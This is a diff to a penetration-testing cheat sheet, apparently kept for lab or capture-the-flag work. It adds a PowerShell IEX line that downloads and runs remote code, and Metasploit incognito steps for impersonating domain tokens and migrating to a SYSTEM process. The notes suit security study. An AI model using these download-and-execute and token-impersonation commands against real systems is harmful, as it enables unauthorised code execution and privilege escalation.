@@ -28,10 +28,12 @@ We need to check if wget or curl is available on the box, if they are, then its 
 curl -O <destination> <source>
 wget <source> -o <destination>
 ```
+
 -> Powershell:
 ```powershell
 Invoke-WebRequest -Uri <source> -OutFile <destination>
 (New-Object System.Net.WebClient).DownloadFile(<source>, <destination>)
+IEX(New-Object System.Net.WebClient).downloadString(<source>)
 ```
 
 -> CMD:
@@ -71,12 +73,16 @@ sudo apt-get install gcc-multilib
 sudo apt-get install libx11-dev:i386 libx11-dev
 ```
 
-## Finding offset of a function in a binary:
-```bash
-
-```
-
 # Active Directory
+## Token Impersonation:
+```bash
+# In Metasploit Meterpreter:
+use incognito
+list_tokens -g
+impersonate_token DOMAIN\\USER
+# Since the token might give you admin, you won't be able to drop into a shell directly, for that, we need to migrate to SYSTEM Process.
+migrate <PROCESS ID>
+```
 
 ## Stabalizing shell:
 ```bash
